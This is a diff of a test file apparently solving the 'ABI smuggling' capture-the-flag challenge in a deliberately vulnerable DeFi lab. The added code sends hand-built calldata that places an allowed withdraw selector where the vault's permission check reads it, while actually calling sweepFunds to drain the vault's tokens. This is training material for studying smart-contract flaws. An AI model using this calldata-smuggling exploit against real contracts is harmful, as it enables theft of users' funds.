@@ -3,7 +3,7 @@ const { expect } = require('chai');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
-    let token, vault, smuggler;
+    let token, vault;
     
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
@@ -45,15 +45,9 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        smuggler = await (await ethers.getContractFactory('Smuggler', player)).deploy(token.address, recovery.address);
-        await smuggler.connect(player).smuggle(vault.address, "0xd9caed12");
-        // let methodId = ethers.utils.id("sweepFunds(address,address)").slice(0, 10);
-                
-        // let calldata = ethers.utils.hexConcat([
-        //     methodId, 
-        //     ethers.utils.defaultAbiCoder.encode(["address", "address"], [recovery.address, token.address])
-        // ]);
-        // await vault.connect(player).execute(vault.address, calldata);
+        let data;
+        data = "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000";                
+        await player.sendTransaction({to: vault.address, data: data, gasLimit: "0x100000"});
     });
 
     after(async function () {
